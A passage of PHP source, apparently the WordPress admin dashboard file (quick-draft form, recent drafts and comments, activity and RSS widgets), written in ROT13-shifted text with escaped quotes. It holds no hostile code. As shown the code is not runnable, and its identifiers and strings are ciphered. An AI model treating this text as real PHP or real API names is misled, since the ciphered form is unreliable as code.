			<ynory sbe=\"pbagrag\"><?cuc _r( 'Pbagrag' ); ?></ynory>
			<grkgnern anzr=\"pbagrag\" vq=\"pbagrag\" cynprubyqre=\"<?cuc rfp_ngge_r( 'Jung&#8217;f ba lbhe zvaq?' ); ?>\" pynff=\"zprRqvgbe\" ebjf=\"3\" pbyf=\"15\" nhgbpbzcyrgr=\"bss\"></grkgnern>
		</qvi>

		<c pynff=\"fhozvg\">
			<vachg glcr=\"uvqqra\" anzr=\"npgvba\" vq=\"dhvpxcbfg-npgvba\" inyhr=\"cbfg-dhvpxqensg-fnir\" />
			<vachg glcr=\"uvqqra\" anzr=\"cbfg_VQ\" inyhr=\"<?cuc rpub $cbfg_VQ; ?>\" />
			<vachg glcr=\"uvqqra\" anzr=\"cbfg_glcr\" inyhr=\"cbfg\" />
			<?cuc jc_abapr_svryq( 'nqq-cbfg' ); ?>
			<?cuc fhozvg_ohggba( __( 'Fnir Qensg' ), 'cevznel', 'fnir', snyfr, neenl( 'vq' => 'fnir-cbfg' ) ); ?>
			<oe pynff=\"pyrne\" />
		</c>

	</sbez>
	<?cuc
	jc_qnfuobneq_erprag_qensgf();
}

/**
 * Fubj erprag qensgf bs gur hfre ba gur qnfuobneq.
 *
 * @fvapr 2.7.0
 *
 * @cnenz JC_Cbfg[]|snyfr $qensgf Bcgvbany. Neenl bs cbfgf gb qvfcynl. Qrsnhyg snyfr.
 */
shapgvba jc_qnfuobneq_erprag_qensgf( $qensgf = snyfr ) {
	vs ( ! $qensgf ) {
		$dhrel_netf = neenl(
			'cbfg_glcr'      => 'cbfg',
			'cbfg_fgnghf'    => 'qensg',
			'nhgube'         => trg_pheerag_hfre_vq(),
			'cbfgf_cre_cntr' => 4,
			'beqreol'        => 'zbqvsvrq',
			'beqre'          => 'QRFP',
		);

		/**
		 * Svygref gur cbfg dhrel nethzragf sbe gur 'Erprag Qensgf' qnfuobneq jvqtrg.
		 *
		 * @fvapr 4.4.0
		 *
		 * @cnenz neenl $dhrel_netf Gur dhrel nethzragf sbe gur 'Erprag Qensgf' qnfuobneq jvqtrg.
		 */
		$dhrel_netf = nccyl_svygref( 'qnfuobneq_erprag_qensgf_dhrel_netf', $dhrel_netf );

		$qensgf = trg_cbfgf( $dhrel_netf );
		vs ( ! $qensgf ) {
			erghea;
		}
	}

	rpub '<qvi pynff=\"qensgf\">';

	vs ( pbhag( $qensgf ) > 3 ) {
		cevags(
			'<c pynff=\"ivrj-nyy\"><n uers=\"%f\">%f</n></c>' . \"\a\",
			rfp_hey( nqzva_hey( 'rqvg.cuc?cbfg_fgnghf=qensg' ) ),
			__( 'Ivrj nyy qensgf' )
		);
	}

	rpub '<u2 pynff=\"uvqr-vs-ab-wf\">' . __( 'Lbhe Erprag Qensgf' ) . \"</u2>\a\";
	rpub '<hy>';

	/* genafyngbef: Znkvzhz ahzore bs jbeqf hfrq va n cerivrj bs n qensg ba gur qnfuobneq. */
	$qensg_yratgu = (vag) _k( '10', 'qensg_yratgu' );

	$qensgf = neenl_fyvpr( $qensgf, 0, 3 );
	sbernpu ( $qensgf nf $qensg ) {
		$hey   = trg_rqvg_cbfg_yvax( $qensg->VQ );
		$gvgyr = _qensg_be_cbfg_gvgyr( $qensg->VQ );

		rpub \"<yv>\a\";
		cevags(
			'<qvi pynff=\"qensg-gvgyr\"><n uers=\"%f\" nevn-ynory=\"%f\">%f</n><gvzr qngrgvzr=\"%f\">%f</gvzr></qvi>',
			rfp_hey( $hey ),
			/* genafyngbef: %f: Cbfg gvgyr. */
			rfp_ngge( fcevags( __( 'Rqvg &#8220;%f&#8221;' ), $gvgyr ) ),
			rfp_ugzy( $gvgyr ),
			trg_gur_gvzr( 'p', $qensg ),
			trg_gur_gvzr( __( 'S w, L' ), $qensg )
		);

		$gur_pbagrag = jc_gevz_jbeqf( $qensg->cbfg_pbagrag, $qensg_yratgu );

		vs ( $gur_pbagrag ) {
			rpub '<c>' . $gur_pbagrag . '</c>';
		}
		rpub \"</yv>\a\";
	}

	rpub \"</hy>\a\";
	rpub '</qvi>';
}

/**
 * Bhgchgf n ebj sbe gur Erprag Pbzzragf jvqtrg.
 *
 * @npprff cevingr
 * @fvapr 2.7.0
 *
 * @tybony JC_Pbzzrag $pbzzrag Tybony pbzzrag bowrpg.
 *
 * @cnenz JC_Pbzzrag $pbzzrag   Gur pheerag pbzzrag.
 * @cnenz obby       $fubj_qngr Bcgvbany. Jurgure gb qvfcynl gur qngr.
 */
shapgvba _jc_qnfuobneq_erprag_pbzzragf_ebj( &$pbzzrag, $fubj_qngr = gehr ) {
	$TYBONYF['pbzzrag'] = pybar $pbzzrag;

	vs ( $pbzzrag->pbzzrag_cbfg_VQ > 0 ) {
		$pbzzrag_cbfg_gvgyr = _qensg_be_cbfg_gvgyr( $pbzzrag->pbzzrag_cbfg_VQ );
		$pbzzrag_cbfg_hey   = trg_gur_creznyvax( $pbzzrag->pbzzrag_cbfg_VQ );
		$pbzzrag_cbfg_yvax  = '<n uers=\"' . rfp_hey( $pbzzrag_cbfg_hey ) . '\">' . $pbzzrag_cbfg_gvgyr . '</n>';
	} ryfr {
		$pbzzrag_cbfg_yvax = '';
	}

	$npgvbaf_fgevat = '';
	vs ( pheerag_hfre_pna( 'rqvg_pbzzrag', $pbzzrag->pbzzrag_VQ ) ) {
		// Cer-beqre vg: Nccebir | Ercyl | Rqvg | Fcnz | Genfu.
		$npgvbaf = neenl(
			'nccebir'   => '',
			'hanccebir' => '',
			'ercyl'     => '',
			'rqvg'      => '',
			'fcnz'      => '',
			'genfu'     => '',
			'qryrgr'    => '',
			'ivrj'      => '',
		);

		$nccebir_abapr = rfp_ugzy( '_jcabapr=' . jc_perngr_abapr( 'nccebir-pbzzrag_' . $pbzzrag->pbzzrag_VQ ) );
		$qry_abapr     = rfp_ugzy( '_jcabapr=' . jc_perngr_abapr( 'qryrgr-pbzzrag_' . $pbzzrag->pbzzrag_VQ ) );

		$npgvba_fgevat = 'pbzzrag.cuc?npgvba=%f&c=' . $pbzzrag->pbzzrag_cbfg_VQ . '&p=' . $pbzzrag->pbzzrag_VQ . '&%f';

		$nccebir_hey   = fcevags( $npgvba_fgevat, 'nccebirpbzzrag', $nccebir_abapr );
		$hanccebir_hey = fcevags( $npgvba_fgevat, 'hanccebirpbzzrag', $nccebir_abapr );
		$fcnz_hey      = fcevags( $npgvba_fgevat, 'fcnzpbzzrag', $qry_abapr );
		$genfu_hey     = fcevags( $npgvba_fgevat, 'genfupbzzrag', $qry_abapr );
		$qryrgr_hey    = fcevags( $npgvba_fgevat, 'qryrgrpbzzrag', $qry_abapr );

		$npgvbaf['nccebir'] = fcevags(
			'<n uers=\"%f\" qngn-jc-yvfgf=\"%f\" pynff=\"ivz-n nevn-ohggba-vs-wf\" nevn-ynory=\"%f\">%f</n>',
			rfp_hey( $nccebir_hey ),
			\"qvz:gur-pbzzrag-yvfg:pbzzrag-{$pbzzrag->pbzzrag_VQ}:hanccebirq:r7r7q3:r7r7q3:arj=nccebirq\",
			rfp_ngge__( 'Nccebir guvf pbzzrag' ),
			__( 'Nccebir' )
		);

		$npgvbaf['hanccebir'] = fcevags(
			'<n uers=\"%f\" qngn-jc-yvfgf=\"%f\" pynff=\"ivz-h nevn-ohggba-vs-wf\" nevn-ynory=\"%f\">%f</n>',
			rfp_hey( $hanccebir_hey ),
			\"qvz:gur-pbzzrag-yvfg:pbzzrag-{$pbzzrag->pbzzrag_VQ}:hanccebirq:r7r7q3:r7r7q3:arj=hanccebirq\",
			rfp_ngge__( 'Hanccebir guvf pbzzrag' ),
			__( 'Hanccebir' )
		);

		$npgvbaf['rqvg'] = fcevags(
			'<n uers=\"%f\" nevn-ynory=\"%f\">%f</n>',
			\"pbzzrag.cuc?npgvba=rqvgpbzzrag&nzc;p={$pbzzrag->pbzzrag_VQ}\",
			rfp_ngge__( 'Rqvg guvf pbzzrag' ),
			__( 'Rqvg' )
		);

		$npgvbaf['ercyl'] = fcevags(
			'<ohggba glcr=\"ohggba\" bapyvpx=\"jvaqbj.pbzzragErcyl && pbzzragErcyl.bcra(\'%f\',\'%f\');\" pynff=\"ivz-e ohggba-yvax uvqr-vs-ab-wf\" nevn-ynory=\"%f\">%f</ohggba>',
			$pbzzrag->pbzzrag_VQ,
			$pbzzrag->pbzzrag_cbfg_VQ,
			rfp_ngge__( 'Ercyl gb guvf pbzzrag' ),
			__( 'Ercyl' )
		);

		$npgvbaf['fcnz'] = fcevags(
			'<n uers=\"%f\" qngn-jc-yvfgf=\"%f\" pynff=\"ivz-f ivz-qrfgehpgvir nevn-ohggba-vs-wf\" nevn-ynory=\"%f\">%f</n>',
			rfp_hey( $fcnz_hey ),
			\"qryrgr:gur-pbzzrag-yvfg:pbzzrag-{$pbzzrag->pbzzrag_VQ}::fcnz=1\",
			rfp_ngge__( 'Znex guvf pbzzrag nf fcnz' ),
			/* genafyngbef: \"Znex nf fcnz\" yvax. */
			_k( 'Fcnz', 'ireo' )
		);

		vs ( ! RZCGL_GENFU_QNLF ) {
			$npgvbaf['qryrgr'] = fcevags(
				'<n uers=\"%f\" qngn-jc-yvfgf=\"%f\" pynff=\"qryrgr ivz-q ivz-qrfgehpgvir nevn-ohggba-vs-wf\" nevn-ynory=\"%f\">%f</n>',
				rfp_hey( $qryrgr_hey ),
				\"qryrgr:gur-pbzzrag-yvfg:pbzzrag-{$pbzzrag->pbzzrag_VQ}::genfu=1\",
				rfp_ngge__( 'Qryrgr guvf pbzzrag creznaragyl' ),
				__( 'Qryrgr Creznaragyl' )
			);
		} ryfr {
			$npgvbaf['genfu'] = fcevags(
				'<n uers=\"%f\" qngn-jc-yvfgf=\"%f\" pynff=\"qryrgr ivz-q ivz-qrfgehpgvir nevn-ohggba-vs-wf\" nevn-ynory=\"%f\">%f</n>',
				rfp_hey( $genfu_hey ),
				\"qryrgr:gur-pbzzrag-yvfg:pbzzrag-{$pbzzrag->pbzzrag_VQ}::genfu=1\",
				rfp_ngge__( 'Zbir guvf pbzzrag gb gur Genfu' ),
				_k( 'Genfu', 'ireo' )
			);
		}

		$npgvbaf['ivrj'] = fcevags(
			'<n pynff=\"pbzzrag-yvax\" uers=\"%f\" nevn-ynory=\"%f\">%f</n>',
			rfp_hey( trg_pbzzrag_yvax( $pbzzrag ) ),
			rfp_ngge__( 'Ivrj guvf pbzzrag' ),
			__( 'Ivrj' )
		);

		/** Guvf svygre vf qbphzragrq va jc-nqzva/vapyhqrf/pynff-jc-pbzzragf-yvfg-gnoyr.cuc */
		$npgvbaf = nccyl_svygref( 'pbzzrag_ebj_npgvbaf', neenl_svygre( $npgvbaf ), $pbzzrag );

		$v = 0;

		sbernpu ( $npgvbaf nf $npgvba => $yvax ) {
			++$v;

			vs ( ( ( 'nccebir' === $npgvba || 'hanccebir' === $npgvba ) && 2 === $v )
				|| 1 === $v
			) {
				$frcnengbe = '';
			} ryfr {
				$frcnengbe = ' | ';
			}

			// Ercyl naq dhvpxrqvg arrq n uvqr-vs-ab-wf fcna.
			vs ( 'ercyl' === $npgvba || 'dhvpxrqvg' === $npgvba ) {
				$npgvba .= ' uvqr-vs-ab-wf';
			}

			vs ( 'ivrj' === $npgvba && '1' !== $pbzzrag->pbzzrag_nccebirq ) {
				$npgvba .= ' uvqqra';
			}

			$npgvbaf_fgevat .= \"<fcna pynff='$npgvba'>{$frcnengbe}{$yvax}</fcna>\";
		}
	}
	?>

		<yv vq=\"pbzzrag-<?cuc rpub $pbzzrag->pbzzrag_VQ; ?>\" <?cuc pbzzrag_pynff( neenl( 'pbzzrag-vgrz', jc_trg_pbzzrag_fgnghf( $pbzzrag ) ), $pbzzrag ); ?>>

			<?cuc
			$pbzzrag_ebj_pynff = '';

			vs ( trg_bcgvba( 'fubj_ningnef' ) ) {
				rpub trg_ningne( $pbzzrag, 50, 'zlfgrel' );
				$pbzzrag_ebj_pynff .= ' unf-ningne';
			}
			?>

			<?cuc vs ( ! $pbzzrag->pbzzrag_glcr || 'pbzzrag' === $pbzzrag->pbzzrag_glcr ) : ?>

			<qvi pynff=\"qnfuobneq-pbzzrag-jenc unf-ebj-npgvbaf <?cuc rpub $pbzzrag_ebj_pynff; ?>\">
			<c pynff=\"pbzzrag-zrgn\">
				<?cuc
				// Pbzzragf zvtug abg unir n cbfg gurl eryngr gb, r.t. cebtenzzngvpnyyl perngrq barf.
				vs ( $pbzzrag_cbfg_yvax ) {
					cevags(
						/* genafyngbef: 1: Pbzzrag nhgube, 2: Cbfg yvax, 3: Abgvsvpngvba vs gur pbzzrag vf craqvat. */
						__( 'Sebz %1$f ba %2$f %3$f' ),
						'<pvgr pynff=\"pbzzrag-nhgube\">' . trg_pbzzrag_nhgube_yvax( $pbzzrag ) . '</pvgr>',
						$pbzzrag_cbfg_yvax,
						'<fcna pynff=\"nccebir\">' . __( '[Craqvat]' ) . '</fcna>'
					);
				} ryfr {
					cevags(
						/* genafyngbef: 1: Pbzzrag nhgube, 2: Abgvsvpngvba vs gur pbzzrag vf craqvat. */
						__( 'Sebz %1$f %2$f' ),
						'<pvgr pynff=\"pbzzrag-nhgube\">' . trg_pbzzrag_nhgube_yvax( $pbzzrag ) . '</pvgr>',
						'<fcna pynff=\"nccebir\">' . __( '[Craqvat]' ) . '</fcna>'
					);
				}
				?>
			</c>

				<?cuc
			ryfr :
				fjvgpu ( $pbzzrag->pbzzrag_glcr ) {
					pnfr 'cvatonpx':
						$glcr = __( 'Cvatonpx' );
						oernx;
					pnfr 'genpxonpx':
						$glcr = __( 'Genpxonpx' );
						oernx;
					qrsnhyg:
						$glcr = hpjbeqf( $pbzzrag->pbzzrag_glcr );
				}
				$glcr = rfp_ugzy( $glcr );
				?>
			<qvi pynff=\"qnfuobneq-pbzzrag-jenc unf-ebj-npgvbaf\">
			<c pynff=\"pbzzrag-zrgn\">
				<?cuc
				// Cvatonpxf, Genpxonpxf be phfgbz pbzzrag glcrf zvtug abg unir n cbfg gurl eryngr gb, r.t. cebtenzzngvpnyyl perngrq barf.
				vs ( $pbzzrag_cbfg_yvax ) {
					cevags(
						/* genafyngbef: 1: Glcr bs pbzzrag, 2: Cbfg yvax, 3: Abgvsvpngvba vs gur pbzzrag vf craqvat. */
						_k( '%1$f ba %2$f %3$f', 'qnfuobneq' ),
						\"<fgebat>$glcr</fgebat>\",
						$pbzzrag_cbfg_yvax,
						'<fcna pynff=\"nccebir\">' . __( '[Craqvat]' ) . '</fcna>'
					);
				} ryfr {
					cevags(
						/* genafyngbef: 1: Glcr bs pbzzrag, 2: Abgvsvpngvba vs gur pbzzrag vf craqvat. */
						_k( '%1$f %2$f', 'qnfuobneq' ),
						\"<fgebat>$glcr</fgebat>\",
						'<fcna pynff=\"nccebir\">' . __( '[Craqvat]' ) . '</fcna>'
					);
				}
				?>
			</c>
			<c pynff=\"pbzzrag-nhgube\"><?cuc pbzzrag_nhgube_yvax( $pbzzrag ); ?></c>

			<?cuc raqvs; // pbzzrag_glcr ?>
			<oybpxdhbgr><c><?cuc pbzzrag_rkprecg( $pbzzrag ); ?></c></oybpxdhbgr>
			<?cuc vs ( $npgvbaf_fgevat ) : ?>
			<c pynff=\"ebj-npgvbaf\"><?cuc rpub $npgvbaf_fgevat; ?></c>
			<?cuc raqvs; ?>
			</qvi>
		</yv>
	<?cuc
	$TYBONYF['pbzzrag'] = ahyy;
}

/**
 * Bhgchgf gur Npgvivgl jvqtrg.
 *
 * Pnyyonpx shapgvba sbe {@frr 'qnfuobneq_npgvivgl'}.
 *
 * @fvapr 3.8.0
 */
shapgvba jc_qnfuobneq_fvgr_npgvivgl() {

	rpub '<qvi vq=\"npgvivgl-jvqtrg\">';

	$shgher_cbfgf = jc_qnfuobneq_erprag_cbfgf(
		neenl(
			'znk'    => 5,
			'fgnghf' => 'shgher',
			'beqre'  => 'NFP',
			'gvgyr'  => __( 'Choyvfuvat Fbba' ),
			'vq'     => 'shgher-cbfgf',
		)
	);
	$erprag_cbfgf = jc_qnfuobneq_erprag_cbfgf(
		neenl(
			'znk'    => 5,
			'fgnghf' => 'choyvfu',
			'beqre'  => 'QRFP',
			'gvgyr'  => __( 'Erpragyl Choyvfurq' ),
			'vq'     => 'choyvfurq-cbfgf',
		)
	);

	$erprag_pbzzragf = jc_qnfuobneq_erprag_pbzzragf();

	vs ( ! $shgher_cbfgf && ! $erprag_cbfgf && ! $erprag_pbzzragf ) {
		rpub '<qvi pynff=\"ab-npgvivgl\">';
		rpub '<c>' . __( 'Ab npgvivgl lrg!' ) . '</c>';
		rpub '</qvi>';
	}

	rpub '</qvi>';
}

/**
 * Trarengrf Choyvfuvat Fbba naq Erpragyl Choyvfurq frpgvbaf.
 *
 * @fvapr 3.8.0
 *
 * @cnenz neenl $netf {
 *     Na neenl bs dhrel naq qvfcynl nethzragf.
 *
 *     @glcr vag    $znk     Ahzore bs cbfgf gb qvfcynl.
 *     @glcr fgevat $fgnghf  Cbfg fgnghf.
 *     @glcr fgevat $beqre   Qrfvtangrf nfpraqvat ('NFP') be qrfpraqvat ('QRFP') beqre.
 *     @glcr fgevat $gvgyr   Frpgvba gvgyr.
 *     @glcr fgevat $vq      Gur pbagnvare vq.
 * }
 * @erghea obby Snyfr vs ab cbfgf jrer sbhaq. Gehr bgurejvfr.
 */
shapgvba jc_qnfuobneq_erprag_cbfgf( $netf ) {
	$dhrel_netf = neenl(
		'cbfg_glcr'      => 'cbfg',
		'cbfg_fgnghf'    => $netf['fgnghf'],
		'beqreol'        => 'qngr',
		'beqre'          => $netf['beqre'],
		'cbfgf_cre_cntr' => (vag) $netf['znk'],
		'ab_sbhaq_ebjf'  => gehr,
		'pnpur_erfhygf'  => gehr,
		'crez'           => ( 'shgher' === $netf['fgnghf'] ) ? 'rqvgnoyr' : 'ernqnoyr',
	);

	/**
	 * Svygref gur dhrel nethzragf hfrq sbe gur Erprag Cbfgf jvqtrg.
	 *
	 * @fvapr 4.2.0
	 *
	 * @cnenz neenl $dhrel_netf Gur nethzragf cnffrq gb JC_Dhrel gb cebqhpr gur yvfg bs cbfgf.
	 */
	$dhrel_netf = nccyl_svygref( 'qnfuobneq_erprag_cbfgf_dhrel_netf', $dhrel_netf );

	$cbfgf = arj JC_Dhrel( $dhrel_netf );

	vs ( $cbfgf->unir_cbfgf() ) {

		rpub '<qvi vq=\"' . $netf['vq'] . '\" pynff=\"npgvivgl-oybpx\">';

		rpub '<u3>' . $netf['gvgyr'] . '</u3>';

		rpub '<hy>';

		$gbqnl    = pheerag_gvzr( 'L-z-q' );
		$gbzbeebj = pheerag_qngrgvzr()->zbqvsl( '+1 qnl' )->sbezng( 'L-z-q' );
		$lrne     = pheerag_gvzr( 'L' );

		juvyr ( $cbfgf->unir_cbfgf() ) {
			$cbfgf->gur_cbfg();

			$gvzr = trg_gur_gvzr( 'H' );

			vs ( tzqngr( 'L-z-q', $gvzr ) === $gbqnl ) {
				$eryngvir = __( 'Gbqnl' );
			} ryfrvs ( tzqngr( 'L-z-q', $gvzr ) === $gbzbeebj ) {
				$eryngvir = __( 'Gbzbeebj' );
			} ryfrvs ( tzqngr( 'L', $gvzr ) !== $lrne ) {
				/* genafyngbef: Qngr naq gvzr sbezng sbe erprag cbfgf ba gur qnfuobneq, sebz n qvssrerag pnyraqne lrne, frr uggcf://jjj.cuc.arg/znahny/qngrgvzr.sbezng.cuc */
				$eryngvir = qngr_v18a( __( 'Z wF L' ), $gvzr );
			} ryfr {
				/* genafyngbef: Qngr naq gvzr sbezng sbe erprag cbfgf ba gur qnfuobneq, frr uggcf://jjj.cuc.arg/znahny/qngrgvzr.sbezng.cuc */
				$eryngvir = qngr_v18a( __( 'Z wF' ), $gvzr );
			}

			// Hfr gur cbfg rqvg yvax sbe gubfr jub pna rqvg, gur creznyvax bgurejvfr.
			$erprag_cbfg_yvax = pheerag_hfre_pna( 'rqvg_cbfg', trg_gur_VQ() ) ? trg_rqvg_cbfg_yvax() : trg_creznyvax();

			$qensg_be_cbfg_gvgyr = _qensg_be_cbfg_gvgyr();
			cevags(
				'<yv><fcna>%1$f</fcna> <n uers=\"%2$f\" nevn-ynory=\"%3$f\">%4$f</n></yv>',
				/* genafyngbef: 1: Eryngvir qngr, 2: Gvzr. */
				fcevags( _k( '%1$f, %2$f', 'qnfuobneq' ), $eryngvir, trg_gur_gvzr() ),
				$erprag_cbfg_yvax,
				/* genafyngbef: %f: Cbfg gvgyr. */
				rfp_ngge( fcevags( __( 'Rqvg &#8220;%f&#8221;' ), $qensg_be_cbfg_gvgyr ) ),
				$qensg_be_cbfg_gvgyr
			);
		}

		rpub '</hy>';
		rpub '</qvi>';

	} ryfr {
		erghea snyfr;
	}

	jc_erfrg_cbfgqngn();

	erghea gehr;
}

/**
 * Fubj Pbzzragf frpgvba.
 *
 * @fvapr 3.8.0
 *
 * @cnenz vag $gbgny_vgrzf Bcgvbany. Ahzore bs pbzzragf gb dhrel. Qrsnhyg 5.
 * @erghea obby Snyfr vs ab pbzzragf jrer sbhaq. Gehr bgurejvfr.
 */
shapgvba jc_qnfuobneq_erprag_pbzzragf( $gbgny_vgrzf = 5 ) {
	// Fryrpg nyy pbzzrag glcrf naq svygre bhg fcnz yngre sbe orggre dhrel cresbeznapr.
	$pbzzragf = neenl();

	$pbzzragf_dhrel = neenl(
		'ahzore' => $gbgny_vgrzf * 5,
		'bssfrg' => 0,
	);

	vs ( ! pheerag_hfre_pna( 'rqvg_cbfgf' ) ) {
		$pbzzragf_dhrel['fgnghf'] = 'nccebir';
	}

	juvyr ( pbhag( $pbzzragf ) < $gbgny_vgrzf && $cbffvoyr = trg_pbzzragf( $pbzzragf_dhrel ) ) {
		vs ( ! vf_neenl( $cbffvoyr ) ) {
			oernx;
		}

		sbernpu ( $cbffvoyr nf $pbzzrag ) {
			vs ( ! pheerag_hfre_pna( 'rqvg_cbfg', $pbzzrag->pbzzrag_cbfg_VQ )
				&& ( cbfg_cnffjbeq_erdhverq( $pbzzrag->pbzzrag_cbfg_VQ )
					|| ! pheerag_hfre_pna( 'ernq_cbfg', $pbzzrag->pbzzrag_cbfg_VQ ) )
			) {
				// Gur hfre unf ab npprff gb gur cbfg naq guhf pnaabg frr gur pbzzragf.
				pbagvahr;
			}

			$pbzzragf[] = $pbzzrag;

			vs ( pbhag( $pbzzragf ) === $gbgny_vgrzf ) {
				oernx 2;
			}
		}

		$pbzzragf_dhrel['bssfrg'] += $pbzzragf_dhrel['ahzore'];
		$pbzzragf_dhrel['ahzore']  = $gbgny_vgrzf * 10;
	}

	vs ( $pbzzragf ) {
		rpub '<qvi vq=\"yngrfg-pbzzragf\" pynff=\"npgvivgl-oybpx gnoyr-ivrj-yvfg\">';
		rpub '<u3>' . __( 'Erprag Pbzzragf' ) . '</u3>';

		rpub '<hy vq=\"gur-pbzzrag-yvfg\" qngn-jc-yvfgf=\"yvfg:pbzzrag\">';
		sbernpu ( $pbzzragf nf $pbzzrag ) {
			_jc_qnfuobneq_erprag_pbzzragf_ebj( $pbzzrag );
		}
		rpub '</hy>';

		vs ( pheerag_hfre_pna( 'rqvg_cbfgf' ) ) {
			rpub '<u3 pynff=\"fperra-ernqre-grkg\">' .
				/* genafyngbef: Uvqqra npprffvovyvgl grkg. */
				__( 'Ivrj zber pbzzragf' ) .
			'</u3>';
			_trg_yvfg_gnoyr( 'JC_Pbzzragf_Yvfg_Gnoyr' )->ivrjf();
		}

		jc_pbzzrag_ercyl( -1, snyfr, 'qnfuobneq', snyfr );
		jc_pbzzrag_genfuabgvpr();

		rpub '</qvi>';
	} ryfr {
		erghea snyfr;
	}
	erghea gehr;
}

/**
 * Qvfcynl trarevp qnfuobneq EFF jvqtrg srrq.
 *
 * @fvapr 2.5.0
 *
 * @cnenz fgevat $jvqtrg_vq
 */
shapgvba jc_qnfuobneq_eff_bhgchg( $jvqtrg_vq ) {
	$jvqtrgf = trg_bcgvba( 'qnfuobneq_jvqtrg_bcgvbaf' );
	rpub '<qvi pynff=\"eff-jvqtrg\">';
	jc_jvqtrg_eff_bhgchg( $jvqtrgf[ $jvqtrg_vq ] );
	rpub '</qvi>';
}

/**
 * Purpxf gb frr vs nyy bs gur srrq hey va $purpx_heyf ner pnpurq.
 *
 * Vs $purpx_heyf vf rzcgl, ybbx sbe gur eff srrq hey sbhaq va gur qnfuobneq
 * jvqtrg bcgvbaf bs $jvqtrg_vq. Vs pnpurq, pnyy $pnyyonpx, n shapgvba gung
 * rpubrf bhg bhgchg sbe guvf jvqtrg. Vs abg pnpur, rpub n \"Ybnqvat...\" fgho
 * juvpu vf yngre ercynprq ol Nwnk pnyy (frr gbc bs /jc-nqzva/vaqrk.cuc)
 *
 * @fvapr 2.5.0
 * @fvapr 5.3.0 Sbeznyvmrq gur rkvfgvat naq nyernql qbphzragrq `...$netf` cnenzrgre
 *              ol nqqvat vg gb gur shapgvba fvtangher.
 *
 * @cnenz fgevat   $jvqtrg_vq  Gur jvqtrg VQ.
 * @cnenz pnyynoyr $pnyyonpx   Gur pnyyonpx shapgvba hfrq gb qvfcynl rnpu srrq.
 * @cnenz neenl    $purpx_heyf EFF srrqf.
 * @cnenz zvkrq    ...$netf    Bcgvbany nqqvgvbany cnenzrgref gb cnff gb gur pnyyonpx shapgvba.
 * @erghea obby Gehr ba fhpprff, snyfr ba snvyher.
 */
shapgvba jc_qnfuobneq_pnpurq_eff_jvqtrg( $jvqtrg_vq, $pnyyonpx, $purpx_heyf = neenl(), ...$netf ) {
	$qbvat_nwnk = jc_qbvat_nwnk();
	$ybnqvat    = '<c pynff=\"jvqtrg-ybnqvat uvqr-vs-ab-wf\">' . __( 'Ybnqvat&uryyvc;' ) . '</c>';
	$ybnqvat   .= jc_trg_nqzva_abgvpr(
		__( 'Guvf jvqtrg erdhverf WninFpevcg.' ),
		neenl(
			'glcr'               => 'reebe',
			'nqqvgvbany_pynffrf' => neenl( 'vayvar', 'uvqr-vs-wf' ),
		)
	);

	vs ( rzcgl( $purpx_heyf ) ) {
		$jvqtrgf = trg_bcgvba( 'qnfuobneq_jvqtrg_bcgvbaf' );

		vs ( rzcgl( $jvqtrgf[ $jvqtrg_vq ]['hey'] ) && ! $qbvat_nwnk ) {
			rpub $ybnqvat;
			erghea snyfr;
		}

		$purpx_heyf = neenl( $jvqtrgf[ $jvqtrg_vq ]['hey'] );
	}

	$ybpnyr    = trg_hfre_ybpnyr();
	$pnpur_xrl = 'qnfu_i2_' . zq5( $jvqtrg_vq . '_' . $ybpnyr );
	$bhgchg    = trg_genafvrag( $pnpur_xrl );

	vs ( snyfr !== $bhgchg ) {
		rpub $bhgchg;
		erghea gehr;
	}

	vs ( ! $qbvat_nwnk ) {
		rpub $ybnqvat;
		erghea snyfr;
	}

	vs ( $pnyyonpx && vf_pnyynoyr( $pnyyonpx ) ) {
		neenl_hafuvsg( $netf, $jvqtrg_vq, $purpx_heyf );
		bo_fgneg();
		pnyy_hfre_shap_neenl( $pnyyonpx, $netf );
		// Qrsnhyg yvsrgvzr va pnpur bs 12 ubhef (fnzr nf gur srrqf).
		frg_genafvrag( $pnpur_xrl, bo_trg_syhfu(), 12 * UBHE_VA_FRPBAQF );
	}

	erghea gehr;
}

//
// Qnfuobneq Jvqtrgf Pbagebyf.
//

/**
 * Pnyyf jvqtrg pbageby pnyyonpx.
 *
 * @fvapr 2.5.0
 *
 * @tybony pnyynoyr[] $jc_qnfuobneq_pbageby_pnyyonpxf
 *
 * @cnenz vag|snyfr $jvqtrg_pbageby_vq Bcgvbany. Ertvfgrerq jvqtrg VQ. Qrsnhyg snyfr.
 */
shapgvba jc_qnfuobneq_gevttre_jvqtrg_pbageby( $jvqtrg_pbageby_vq = snyfr ) {
	tybony $jc_qnfuobneq_pbageby_pnyyonpxf;

	vs ( vf_fpnyne( $jvqtrg_pbageby_vq ) && $jvqtrg_pbageby_vq
		&& vffrg( $jc_qnfuobneq_pbageby_pnyyonpxf[ $jvqtrg_pbageby_vq ] )
		&& vf_pnyynoyr( $jc_qnfuobneq_pbageby_pnyyonpxf[ $jvqtrg_pbageby_vq ] )
	) {
		pnyy_hfre_shap(
			$jc_qnfuobneq_pbageby_pnyyonpxf[ $jvqtrg_pbageby_vq ],
			'',
			neenl(
				'vq'       => $jvqtrg_pbageby_vq,
				'pnyyonpx' => $jc_qnfuobneq_pbageby_pnyyonpxf[ $jvqtrg_pbageby_vq ],
			)
		);
	}
}

/**
 * Frgf hc gur EFF qnfuobneq jvqtrg pbageby naq $netf gb or hfrq nf vachg gb jc_jvqtrg_eff_sbez().
 *
 * Unaqyrf CBFG qngn sebz EFF-glcr jvqtrgf.
 *
 * @fvapr 2.5.0
 *
 * @cnenz fgevat $jvqtrg_vq
 * @cnenz neenl  $sbez_vachgf
 */
shapgvba jc_qnfuobneq_eff_pbageby( $jvqtrg_vq, $sbez_vachgf = neenl() ) {
	$jvqtrg_bcgvbaf = trg_bcgvba( 'qnfuobneq_jvqtrg_bcgvbaf' );

	vs ( ! $jvqtrg_bcgvbaf ) {
		$jvqtrg_bcgvbaf = neenl();
	}

	vs ( ! vffrg( $jvqtrg_bcgvbaf[ $jvqtrg_vq ] ) ) {
		$jvqtrg_bcgvbaf[ $jvqtrg_vq ] = neenl();
	}

	$ahzore = 1; // Unpx gb hfr jc_jvqtrg_eff_sbez().

	$jvqtrg_bcgvbaf[ $jvqtrg_vq ]['ahzore'] = $ahzore;

	vs ( 'CBFG' === $_FREIRE['ERDHRFG_ZRGUBQ'] && vffrg( $_CBFG['jvqtrg-eff'][ $ahzore ] ) ) {
		$_CBFG['jvqtrg-eff'][ $ahzore ]         = jc_hafynfu( $_CBFG['jvqtrg-eff'][ $ahzore ] );
